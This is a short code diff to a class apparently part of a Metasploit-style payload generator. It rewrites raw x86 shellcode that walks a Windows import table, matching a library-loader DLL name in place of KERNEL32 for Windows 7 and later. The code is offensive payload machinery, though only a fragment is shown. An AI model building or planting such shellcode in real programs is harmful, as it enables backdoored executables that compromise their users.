@@ -497,12 +497,20 @@ class x86_windows_metasploit:
             # findImport
             "\x8b\x57\x0c"                          # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
             "\x03\xd3"                              # add edx, ebx                          ;Offset in memory
-            "\x81\x3a\x4b\x45\x52\x4e"              # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
-            "\x75\x09"                              # JE short 
-            "\x81\x7A\x04\x45\x4C\x33\x32"          # CMP DWORD PTR DS:[EDX+4],32334C45 ; el32
-            "\x74\x05"                              # je 0x102f                             ;jmp saveBase
+            # Update this for API-MS-WIN-CORE-LIBRARYLOADER-L1-2-0.DLL for win-7 ++
+            #'''
+            #"\x81\x3a\x4b\x45\x52\x4e"              # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
+            #"\x75\x09"                              # JE short 
+            #"\x81\x7A\x04\x45\x4C\x33\x32"          # CMP DWORD PTR DS:[EDX+4],32334C45     ; el32
+            #"\x74\x05"                              # je 0x102f                             ;jmp saveBase
+            #'''
+            "\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172 ; cp rary
+            "\x75\x09"
+            "\x81\x7A\x18\x6F\x61\x64\x65"           # CMP DWORD PTR DS:[EDX+18],6564616F
+            "\x74\x05"
+
             "\x83\xc7\x14"                          # add edi, 0x14                         ;inc to next import
-            "\xeb\xe5"                              # jmp 0x101d                            ;Jmp findImport
+            "\xeb\xe4"                              # jmp 0x101d                            ;Jmp findImport
             # saveBase
             "\x57"                                  # push edi
             "\xeb\x39"                              # jmp short 0x9f
